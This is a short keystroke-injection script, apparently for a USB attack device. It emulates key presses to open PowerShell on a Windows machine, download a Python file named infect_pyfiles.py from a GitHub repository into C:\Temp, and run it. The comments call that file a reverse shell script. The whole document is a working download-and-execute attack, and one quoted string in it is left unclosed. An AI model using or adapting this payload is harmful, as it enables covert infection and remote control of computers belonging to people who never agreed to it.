language = "us";

function enter() { press("ENTER"); }

function downloadPyVirus() {
	// make temp directory in c:\ to store reverse shell script
	type("mkdir C:\\Temp");
	enter();
	delay(200);
	// download reverse shell script from Nishang repository
	type("IWR 'https://raw.githubusercontent.com/binexisHATT/EthicalHacking/master/PyMalware/PyBackdoorInjection/infect_pyfiles.py' -UseBasicParsing -OutFile 'C:\\Temp\\v.py'");
	enter();
	delay(200);
}

function executeVirus() {
	type("cmd.exe /c 'C:\\Temp\\v.py');
	enter();
}
	     
/********************************************************/

// keyboard layout
layout(language);

// emulate someone pressing Windows key + R to run programs
press("WIN R");
delay(200);

// open a powershell window
type("powershell");
enter();
delay(500);

downloadPyVirus();
executeVirus();
